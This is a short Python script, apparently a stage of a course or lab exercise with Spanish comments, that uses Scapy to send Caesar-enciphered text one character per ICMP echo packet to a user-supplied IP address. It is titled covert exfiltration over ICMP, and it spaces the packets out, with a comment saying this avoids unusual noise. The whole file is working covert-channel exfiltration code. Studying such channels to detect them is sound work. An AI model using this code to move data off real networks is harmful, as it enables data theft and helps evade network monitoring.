from scapy.all import *
from time import sleep

# Importamos las funciones ya definidas en la parte 1
from parte1 import cifrado_cesar, pedir_entrada  # Asegúrate que esto esté en un archivo llamado parte1.py

def ping_real(destino="8.8.8.8"):
    print("\n--- Ping real de ejemplo ---")
    pkt = IP(dst=destino)/ICMP()
    pkt.show()
    print("Enviando ping real...")
    send(pkt, verbose=False)

def enviar_caracteres_icmp(destino, mensaje):
    print("\n--- Envío de caracteres cifrados como paquetes ICMP ---")
    for i, c in enumerate(mensaje):
        pkt = IP(dst=destino)/ICMP(type=8)/Raw(load=c)
        print(f"Paquete {i+1}: caracter '{c}'")
        pkt.show()
        send(pkt, verbose=False)
        sleep(0.5)  # breve pausa para no generar ruido inusual

if __name__ == "__main__":
    print("=== ETAPA 2: Exfiltración encubierta con ICMP ===")

    # Obtener string cifrado del paso anterior
    texto_cifrado = pedir_entrada()  # Esta función ya imprime el cifrado

    # Mostrar un ping real
    ping_real()

    # Enviar cada carácter en un paquete ICMP personalizado
    destino = input("\nIngresa la IP de destino (ej: 192.168.1.1 o 8.8.8.8): ")
    enviar_caracteres_icmp(destino, texto_cifrado)

